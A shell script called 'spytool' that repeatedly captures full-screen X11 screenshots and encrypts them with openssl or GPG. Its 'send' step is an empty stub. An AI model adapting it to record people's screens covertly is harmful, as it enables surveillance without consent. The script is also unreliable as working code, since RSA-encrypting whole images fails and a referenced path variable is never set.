#! /usr/bin/env sh
######################################################################
# This script make some screenshot and encrypt them with openssl. 
#
# Copyright (c) 2013, Niamkik
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or
# without modification, are permitted provided that the following
# conditions are met: * Redistributions of source code must
# retain the above copyright notice, this list of conditions and
# the following disclaimer.  * Redistributions in binary form
# must reproduce the above copyright notice, this list of
# conditions and the following disclaimer in the documentation
# and/or other materials provided with the distribution.  *
# Neither the name of the <organization> nor the names of its
# contributors may be used to endorse or promote products derived
# from this software without specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND
# CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES,
# INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
# MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
# DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR
# ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
# PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA,                                                                               # OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY                                                                               # THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
# TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT
# OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY
# OF SUCH DAMAGE.
#
# link:
# http://cvsweb.xfree86.org/cvsweb/xc/programs/xwd/xwd.c?rev=HEAD&content-type=text/vnd.viewcvs-markup
# http://unix.stackexchange.com/questions/12260/how-to-encrypt-messages-text-with-rsa-using-openssl
# https://www.openssl.org/docs/HOWTO/keys.txt
#
######################################################################

FLAG_PKEY=""

FILE_EXT="spyshot"
COUNT_VALUE="10"

CMD_SHOT="xwd"
CMD_SHOT_ARGS="-root"
CMD_IMAGE_FORMAT="pnmtopng"
CMD_IMAGE_CONVERTER="xwdtopnm"

SHOT_PATH="shot"
LOG_FILE="spytool.log"

PKEY_TOOL="openssl"
PKEY_SIZE="4096"
PKEY_NAME="spytool.${FLAG_PKEY}"
PKEY_CIPHER="aes256"
PKEY_PASS=""

print () {
    printf -- "$*\n"
}

usage () {
    print "Usage: $0 [init|compress|cronjob|shot|send]"
}

generate_filename () {
    HASH="sha1"
    DATE=$(date "+%s")
    CKSUM=$(printf "$DATE" \
	         | ${PKEY_TOOL} ${HASH})
    printf -- "${DATE}"."${CKSUM}"."${FILE_EXT}"
}

generate_rsa_private_key () {
    if [ "$PKEY_NAME" ]
    then
	GENRSA_ARG="genrsa -${PKEY_CIPHER} -out ${PKEY_NAME} ${PKEY_SIZE}"
    else
	GENRSA_ARG="genrsa -out ${PKEY_NAME} ${PKEY_SIZE}"
    fi

    if ! [ -f "${PKEY_NAME}" ]
    then
	print "Generate private key..."
	${PKEY_TOOL} ${GENRSA_ARG} 2>&1 > "${LOG_FILE}"
    else
	print "Private key ${PKEY_NAME} exist. Recreate it? yes/no"
	read RESPONSE
	if [ ${RESPONSE} == "yes" ]
	then	
	    print "Generate private key..."
	    ${PKEY_TOOL} ${GENRSA_ARG} 2>&1 > "${LOG_FILE}"
	fi
    fi
}

generate_rsa_public_key () {
    if [ -f "${PKEY_NAME}" ]
    then
	${PKEY_TOOL} rsa -outform PEM -in "${PKEY_NAME}" \
	                 -pubout > "${PKEY_NAME}.public"
    fi
}

generate_gpg_key () {
    gpg2 --batch --gen-key - << EOF
Key-Type: RSA
Key-Length: 1024
Subkey-Type: ELG-E
Subkey-Length: 1024
Name-Real: Spytool
Name-Comment: with stupid passphrase
Name-Email: joe@foo.bar
Expire-Date: 0
%pubring ${PKEY_NAME}.public
%secring ${PKEY_NAME}
%commit
EOF
}

generate_shot_path () {
    if ! [ -d "${SHOT_PATH}" ]
    then
	mkdir -p "${SHOT_PATH}"
	return 0
    fi
    return 0
}

generate_shot () {
    ${CMD_SHOT} ${CMD_SHOT_ARGS}       2> ${LOG_FILE} \
	      | ${CMD_IMAGE_CONVERTER} 2> ${LOG_FILE} \
	      | ${CMD_IMAGE_FORMAT}    2> ${LOG_FILE} \
	      > "${SHOT_PATH}/$(generate_filename)"
}

generate_shot_rsa () {
    if [ -f "${PKEY_NAME}.public" ]
    then
	${CMD_SHOT} ${CMD_SHOT_ARGS}       2> ${LOG_FILE} \
	          | ${CMD_IMAGE_CONVERTER} 2> ${LOG_FILE} \
	          | ${CMD_IMAGE_FORMAT}    2> ${LOG_FILE} \
	          | ${PKEY_TOOL} rsautl -encrypt -pubin \
	                                -inkey "${PKEY_NAME}.public" \
	          > "${SHOT_PATH}/$(generate_filename)"
    fi
}

generate_shot_gpg () {
    if [ -f "${PKEY_NAME}.public" ]
    then
	${CMD_SHOT} ${CMD_SHOT_ARGS}       2> ${LOG_FILE} \
	          | ${CMD_IMAGE_CONVERTER} 2> ${LOG_FILE} \
	          | ${CMD_IMAGE_FORMAT}    2> ${LOG_FILE} \
	          | gpg --encrypt \
	          > "${SHOT_PATH}/$(generate_filename)" 
    fi
}

case "$1" in 
    init) 
	if [ "${FLAG_PKEY}" == "gpg" ]
	then 
	    generate_gpg_key
	else
	    generate_rsa_private_key && generate_rsa_public_key 
	fi ;;
    
    compress) ;;
    cronjob) 
	generate_shot_path
	COUNT=0 
	while [ $COUNT -lt 60 ]
	do 
	    generate_shot
	    COUNT=$((${COUNT}+${COUNT_VALUE}))
	    sleep ${COUNT_VALUE}
	done 
	tar czvf ${SHOT_PATH}/test.tar.gz "${IMAGE_PATH}/*.${FILE_EXT}" ;;

    shot) 
	if [ "${FLAG_PKEY}" == "gpg" ]
	then 
	    generate_shot_path && generate_shot_gpg
	elif [ "${FLAG_PKEY}" == "rsa" ]
	then
	    generate_shot_path && generate_shot_rsa
	else
	    generate_shot_path && generate_shot
	fi ;;

    send) ;;
    *) usage;;
esac

